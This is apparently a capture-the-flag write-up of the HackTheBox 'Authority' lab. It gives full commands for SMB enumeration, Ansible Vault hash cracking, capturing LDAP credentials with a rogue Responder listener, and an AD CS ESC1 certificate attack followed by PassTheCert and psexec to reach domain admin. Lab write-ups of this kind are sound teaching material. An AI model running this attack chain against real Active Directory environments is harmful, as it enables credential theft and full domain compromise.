---
title: "Authority HackTheBox" 
date: 2025-07-19 23:50:00 0000+
tags: [WriteUp, Authority, HTB, Enumeration, Active Directory, ADCS, Responder, SmartCardLogin, Bloodhound, Rusthound-CE, ESC1, PassTheCert, Privilege Escalation, Windows]
categories: [WriteUps, HackTheBox]
image:
  path: /assets/images/Authority_HTB/preview_authority.png
---
# Authority HTB Writeup

Authority is the medium level HackTheBox machine which focusses on the ansible-vault password cracking, and then decrypting those passwords, also using responder to connect back to us by creating a rogue ldap server to get the creds of a ldap user in the domain, upon further enumeration we observed that the domain computers can do ESC1 on the CA to enroll certificates, but the smartcard logon was disable so we used pass the cert to get a ldap shell and then add our ldap user to the domain admins and administrators group to get the administrator flag.

![image.png](/assets/images/Authority_HTB/image.png)

## Initial Enumeration

As always we are gonna start off with the rustmap to find the open ports and services.

```bash
rustmap.py -ip 10.129.229.56
```

![image.png](/assets/images/Authority_HTB/image%201.png)

![image.png](/assets/images/Authority_HTB/image%202.png)

![image.png](/assets/images/Authority_HTB/image%203.png)

![image.png](/assets/images/Authority_HTB/image%204.png)

### SMB Enumeration

Tried to do guest enumeration on SMB shares.

```bash
nxc smb 10.129.229.56 -u '.' -p '' --shares
```

![image.png](/assets/images/Authority_HTB/image%205.png)

Connecting to the share using SMB client.

```bash
smbclient //authority.htb/Development ''%
```

There is a automation folder in the share.

Now looking at the automation folder, we have numerous folders in it.

Now find some potential clues, usernames and passwords in it.

![image.png](/assets/images/Authority_HTB/image%206.png)

We found some of the credentials.

Also lets just enumerate all the users on the box using RID cycling.

```bash
nxc smb 10.129.229.56 -u '.' -p '' --rid-brute 3000
```

![image.png](/assets/images/Authority_HTB/image%207.png)

Saved all users to usernames.txt and potential passwords obtained form the Development share to the passwords.txt

I tried to do the password spray on the possible accounts but it was of no use.

Again started enumerating the **Automation Folder** and found these Ansible Vault hashes.

![image.png](/assets/images/Authority_HTB/image%208.png)

Stored them into a three hash files.

Used ansible2john to convert these hashes into JTR crack able format.

![image.png](/assets/images/Authority_HTB/image%209.png)

Now using JohnTheRipper to crack the hashes.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt pwmadminlogin.hash pwmadminpass.hash ldapadminpass.hash
```

![image.png](/assets/images/Authority_HTB/image%2010.png)

Fortunately all of the three hashes have the same passwords.

Tried this password on our webpage but it is of no use.

Did some research on ansible-vaults and found that we can decrypt the hashes using the ansible-vault so performed these operations.

![image.png](/assets/images/Authority_HTB/image%2011.png)

By specifying ‘!@#$%^&*’ as the vault’s password we can decrypt the ansible secrets giving us three different passwords, stored these passwords to our passwords.txt file.

### Web Enumeration

Using the pwm_adminpassword we logged in into the configuration manager of the password self service.

Downloaded the localdb and pwmconfiguration from the configuration manager.

![image.png](/assets/images/Authority_HTB/image%2012.png)

The backup file and the config files were of no use to us.

## Exploitation

I explored the configuration editor and found this interesting LDAP configuration page.

![image.png](/assets/images/Authority_HTB/image%2013.png)

Here In the LDAP URLs section, I added my rogue ldap server IP that is tun0 IP and started a listener using responder to see if we get a connect back.

![image.png](/assets/images/Authority_HTB/image%2014.png)

After clicking the **TEST LDAP PROFILE.** We got a hit back with the clear text credentials for the svc_ldap account.

### Shell as svc_ldap

Saving those creds to the passwords.txt file.

We can confirm that those are valid for svc_ldap by using NetExec.

```bash
nxc winrm authority.htb -u usernames.txt -p 'lDaP_1n_th3_cle4r!' --continue-on-success
```

![image.png](/assets/images/Authority_HTB/image%2015.png)

We have valid creds but over LDAPS.

Checking the winrm permissions.

```bash
nxc winrm authority.htb -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!'
```

![image.png](/assets/images/Authority_HTB/image%2016.png)

Logging in using **Evil-Winrm.**

```bash
evil-winrm -i authority.htb -u svc_ldap -p 'lDaP_1n_th3_cle4r!'
```

![image.png](/assets/images/Authority_HTB/image%2017.png)

## Privilege Escalation

I enumerated the machine a lot for the privesc vectors but didn’t seem to find anything.

So lets just proceed with the bloodhound enumeration.

### Bloodhound

Using rusthoundCE to gather ldap data.

```bash
rusthound-ce -d authority.htb -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!' -f authority.authority.htb -z --ldaps
```

Used LDAPS to authenticate.

![image.png](/assets/images/Authority_HTB/image%2018.png)

Looking at the bloodhound data.

![image.png](/assets/images/Authority_HTB/image%2019.png)

We can see that the domain users can enroll 

So using the Oliver Lyak’s certipy from github to find the vulnerable templates svc_ldap has access to.

### ESC1

```bash
certipy find -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!' -dc-ip 10.129.229.56 -vulnerable -text -enabled
```

![image.png](/assets/images/Authority_HTB/image%2020.png)

We can see that it gathered some templates and the certificate authority.

Looking at the results.

```text
Certificate Authorities
  0
    CA Name                             : AUTHORITY-CA
    DNS Name                            : authority.authority.htb
    Certificate Subject                 : CN=AUTHORITY-CA, DC=authority, DC=htb
    Certificate Serial Number           : 2C4E1F3CA46BBDAF42A1DDE3EC33A6B4
    Certificate Validity Start          : 2023-04-24 01:46:26+00:00
    Certificate Validity End            : 2123-04-24 01:56:25+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : AUTHORITY.HTB\Administrators
      Access Rights
        ManageCa                        : AUTHORITY.HTB\Administrators
                                          AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
        ManageCertificates              : AUTHORITY.HTB\Administrators
                                          AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
        Enroll                          : AUTHORITY.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : CorpVPN
    Display Name                        : Corp VPN
    Certificate Authorities             : AUTHORITY-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
                                          AutoEnrollmentCheckUserDsCertificate
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Encrypting File System
                                          Secure Email
                                          Client Authentication
                                          Document Signing
                                          IP security IKE intermediate
                                          IP security use
                                          KDC Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 20 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2023-03-24T23:48:09+00:00
    Template Last Modified              : 2023-03-24T23:48:11+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : AUTHORITY.HTB\Domain Computers
                                          AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : AUTHORITY.HTB\Administrator
        Full Control Principals         : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
        Write Owner Principals          : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
        Write Dacl Principals           : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
        Write Property Enroll           : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
    [+] User Enrollable Principals      : AUTHORITY.HTB\Domain Computers
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.

```

We can see that it is vulnerable to the ESC1 by the above output.

By looking at the above output we can see that only the domain computers have privileges to enroll certificates.

So I will use the **impacket’s addcomputer.py** to add a computer to the domain.

```bash
impacket-addcomputer -computer-name 'aashwin$' -computer-pass 'aashwin10!' authority.htb/svc_ldap:'lDaP_1n_th3_cle4r!'
```

![image.png](/assets/images/Authority_HTB/image%2021.png)

And after adding the machine account to the domain we request certificates from it.

```bash
certipy req -u 'aashwin$' -p 'aashwin10!' -dc-ip 10.129.229.56  -template 'CorpVPN' -ca 'AUTHORITY-CA' -upn 'Administrator@authority.htb'
```

![image.png](/assets/images/Authority_HTB/image%2022.png)

We got the administrator.pfx

So now lets just authenticate as an administrator.

```bash
certipy auth -pfx administrator.pfx -dc-ip 10.129.229.56
```

But it failed to authenticate with shows this error.

```text
(certipy-authority) ┌─[root@parrot]─[/home/aashwin/Desktop/HTB/Machines/Authority]
└──_# certipy auth -pfx administrator.pfx -dc-ip 10.129.229.56                                                                                                          
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'Administrator@authority.htb'
[*] Using principal: 'administrator@authority.htb'
[*] Trying to get TGT...
[-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)
[-] Use -debug to print a stacktrace
[-] See the wiki for more information
```

SmartCard Login is now enabled which is PKIINIT is disabled so we cant login right away.

So I referred to this article here.

[https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html](https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html)

### Pass The Cert

Now using the impacket’s passthecert.py to add our machine account to the domain admins group.

Lets just extract the key and cert from our administrator.pfx file.

```bash
certipy cert -pfx administrator.pfx -nokey -out administrator.crt
certipy cert -pfx administrator.pfx -nocert -out administrator.key
```

Lets add our machine account to the domain admins group.

![image.png](/assets/images/Authority_HTB/image%2023.png)

```bash
/opt/PassTheCert/Python/passthecert.py -action ldap-shell -crt administrator.crt -key administrator.key -domain authority.htb -dc-ip 10.129.229.56
```

![image.png](/assets/images/Authority_HTB/image%2024.png)

Using the ldap shell we have added ourselves to the domain admin and Administrators group.

Also now we generate a TGT.

![image.png](/assets/images/Authority_HTB/image%2025.png)

After generating the TGT we can login with PSexec.py to get a shell.

```bash
impacket-psexec -k -no-pass authority.htb/svc_ldap@authority.authority.htb
```

![image.png](/assets/images/Authority_HTB/image%2026.png)

Now simple we move to the Administrator desktop directory and grab root flag.

![image.png](/assets/images/Authority_HTB/image%2027.png)

Submitting that root.txt flag.

![image.png](/assets/images/Authority_HTB/image%2028.png)

Thanks for reading !!
